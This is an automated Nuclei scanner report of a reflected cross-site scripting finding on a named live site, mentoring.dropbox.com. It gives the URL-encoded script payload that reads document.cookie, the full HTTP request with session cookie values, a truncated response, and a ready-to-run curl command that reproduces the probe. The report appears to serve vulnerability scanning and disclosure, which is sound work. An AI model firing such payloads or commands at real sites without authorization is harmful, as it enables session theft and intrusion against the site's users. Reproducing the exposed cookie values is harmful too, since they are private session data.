### Id XSS - Cross-Site Scripting (id-xss) found on https://mentoring.dropbox.com

----
**Details**: **id-xss** matched at https://mentoring.dropbox.com

**Protocol**: HTTP

**Full URL**: https://mentoring.dropbox.com/?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

**Timestamp**: Sat Dec 9 15:12:31 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Id XSS - Cross-Site Scripting |
| Authors | yarovit |
| Tags | xss, id |
| Severity | low |
| Description | A cross-site scripting vulnerability was discovered via id testing. Manual testing is needed to verify exploitation. |

**Request**
```http
GET /?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: mentoring.dropbox.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Cookie: AWSALB=MND4AmxQAM9BJO/9iGiuC/igGIAK6lnGllI0MKuc+R46rOW8Dub+CLmeq6viggBZQyTSyio201lqqoRAtFyWQa+9qLuZX2XtWcs7I/8HGMxexNTV1lqfqtHqYTwN; AWSALBCORS=MND4AmxQAM9BJO/9iGiuC/igGIAK6lnGllI0MKuc+R46rOW8Dub+CLmeq6viggBZQyTSyio201lqqoRAtFyWQa+9qLuZX2XtWcs7I/8HGMxexNTV1lqfqtHqYTwN; uniq_token=f03c8630-88c8-48b7-b3fa-bdcb9a615731
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-store
Content-Security-Policy: frame-ancestors teams.microsoft.com *.teams.microsoft.com 'self';
Content-Security-Policy-Report-Only: default-src 'none'; font-src 'self' data: https://d28ysuyw2f6yxp.cloudfront.net https://mentor-global-assets.chronus.com https://fonts.gstatic.com/ https://*.fontawesome.com https://chronus.com/ https://www.slant.co/ https://at.alicdn.com https://use.typekit.net https://zip.co/ https://github.com/google/fonts/blob/master/apache/opensans; img-src * data:; object-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline' data: https://d28ysuyw2f6yxp.cloudfront.net *.google-analytics.com *.googletagmanager.com https://ajax.googleapis.com *.pendo.io https://pendo-static-6184273133961216.storage.googleapis.com https://pendo-io-static.storage.googleapis.com https://js-agent.newrelic.com *.nr-data.net https://cdn.segment.com/ *.mxpnl.com https://mentor-global-assets.chronus.com; style-src 'self' 'unsafe-eval' 'unsafe-inline' data: https://d28ysuyw2f6yxp.cloudfront.net https://mentor-global-assets.chronus.com https://fonts.googleapis.com/ *.pendo.io https://pendo-static-6184273133961216.storage.googleapis.com; connect-src 'self' wss: data: *.nr-data.net *.google-analytics.com *.googletagmanager.com *.pendo.io https://pendo-static-6184273133961216.storage.googleapis.com https://api.segment.io/ https://cdn.segment.com/ *.mixpanel.com https://d28ysuyw2f6yxp.cloudfront.net; frame-src 'self' data: *; frame-ancestors teams.microsoft.com *.teams.microsoft.com 'self'; base-uri 'self'; form-action 'self'; child-src 'self' app.pendo.io; manifest-src 'self'; media-src 'self' data:; prefetch-src 'self' data: https://d28ysuyw2f6yxp.cloudfront.net; worker-src 'self'; report-uri /log_csp_violation
Content-Type: text/html; charset=utf-8
Date: Sat, 09 Dec 2023 15:12:31 GMT
Etag: W/"a509a518b54b05a9bce0f486e0ce8d7d"
Pragma: no-cache
Referrer-Policy: strict-origin-when-cross-origin
Set-Cookie: AWSALB=/F63MPTYPicAhgwbxtcZWyge/eV8beshlxh64ydJBX9ccpV82HvTkx7sBqlksrS/ebQa/rY7ANNBV8gAWKn8xRVGZQGx10n3Czzm0xcRxyOJcE0ZoUm6ICDuSxrI; Expires=Sat, 16 Dec 2023 15:12:31 GMT; Path=/
Set-Cookie: AWSALBCORS=/F63MPTYPicAhgwbxtcZWyge/eV8beshlxh64ydJBX9ccpV82HvTkx7sBqlksrS/ebQa/rY7ANNBV8gAWKn8xRVGZQGx10n3Czzm0xcRxyOJcE0ZoUm6ICDuSxrI; Expires=Sat, 16 Dec 2023 15:12:31 GMT; Path=/; SameSite=None; Secure
Set-Cookie: _mentor_session=146f16bece3dc52be65e450912f0fe3a; domain=.dbxmentoring.chronus.com; path=/; secure; HttpOnly; SameSite=None
Status: 200 OK
Strict-Transport-Security: max-age=63072000
Vary: Accept-Encoding
Via: 1.1 4d1daf728c8f336e79bd83ec18bb8cb0.cloudfront.net (CloudFront)
X-Amz-Cf-Id: 5c0S0CVdyU9GzfizdPX3CNMsCgwTn3r_h2mcY3ia7sdB769JY9sPwQ==
X-Amz-Cf-Pop: MRS52-P1
X-Cache: Miss from cloudfront
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 835359bb-039b-4957-9823-fd6c12487783
X-Robots-Tag: noindex
X-Runtime: 0.064129
X-Xss-Protection: 1; mode=block

<!DOCTYPE html>
<html lang="en" xml:lang="en" xmlns="https://www.w3.org/1999/xhtml">
  <head>
    
    <link rel="preconnect" href="https://d28ysuyw2f6yxp.cloudfront.net/" crossorigin/>
<link rel="preconnect" href="https://www.google-analytics.com/"/>
<link rel="preconnect" href="https://chronus-mentor.s3.amazonaws.com/"/>
<link rel="preconnect" href="https://mentor-global-assets.chronus.com/" crossorigin/>
<link rel="preconnect" href="https://mentor-global-assets.chronus.com/"/>
    <meta charset="utf-8">
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","errorBeacon":"bam.nr-data.net","licenseKey":"fe0883d790","applicationID":"75707","transactionName":"Jg5cFUVcX1pSEUpXEAIAXAhNUkdfWA0WFxENDkU=","queueTime":1,"applicationTime":58,"agent":"","atts":"HkNHQw1IEWJFAgNeCwYuQAhQWl0UDUEKTAoAE0FDGxF8RFA8LHxAX1MKUwcfEWRYDwBLQF9DXA5DE19ZUAQAXEIMDxBNFWFWR0IGFkxPLCUQWxULAAMEVlxaAEhRAVhVHgcPAlRIAVpXUh8HUwVQBwVXXQ9VXVIQHEo="}</script>
<script type="text/javascript">(window.NREUM||(NREUM={})).init={privacy:{cookies_enabled:true},ajax:{deny_list:["bam.nr-data.net"]}};(window.NREUM||(NREUM={})).loader_config={xpid:"VgcAWV5ADwYHVFY=",licenseKey:"fe0883d790",applicationID:"75707"};;/*! For license information please see nr-loader-full-1.248.0.min.js.LICENSE.txt */
(()=>{var e,t,r={234:(e,t,r)=>{"use strict";r.d(t,{P_:()=>g,Mt:()=>v,C5:()=>s,DL:()=>A,OP:()=>S,lF:()=>R,Yu:()=>w,Dg:()=>m,CX:()=>c,GE:()=>x,sU:()=>j});var n=r(8632),i=r(9567);const a={beacon:n.ce.beacon,errorBeacon:n.ce.errorBeacon,licenseKey:void 0,applicationID:void 0,sa:void 0,queueTime:void 0,applicationTime:void 0,ttGuid:void 0,user:void 0,account:void 0,product:void 0,extra:void 0,jsAttributes:{},userAttributes:void 0,atts:void 0,transactionName:void 0,tNamePlain:void 0},o={};function s(e){if(!e)throw new Error("All info objects require an agent identifier!");if(!o[e])throw new Error("Info for ".concat(e," was never set"));return o[e]}function c(e,t){if(!e)throw new Error("All info objects r.... Truncated ....
```


**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: AWSALB=MND4AmxQAM9BJO/9iGiuC/igGIAK6lnGllI0MKuc+R46rOW8Dub+CLmeq6viggBZQyTSyio201lqqoRAtFyWQa+9qLuZX2XtWcs7I/8HGMxexNTV1lqfqtHqYTwN; AWSALBCORS=MND4AmxQAM9BJO/9iGiuC/igGIAK6lnGllI0MKuc+R46rOW8Dub+CLmeq6viggBZQyTSyio201lqqoRAtFyWQa+9qLuZX2XtWcs7I/8HGMxexNTV1lqfqtHqYTwN; uniq_token=f03c8630-88c8-48b7-b3fa-bdcb9a615731' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'https://mentoring.dropbox.com/?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)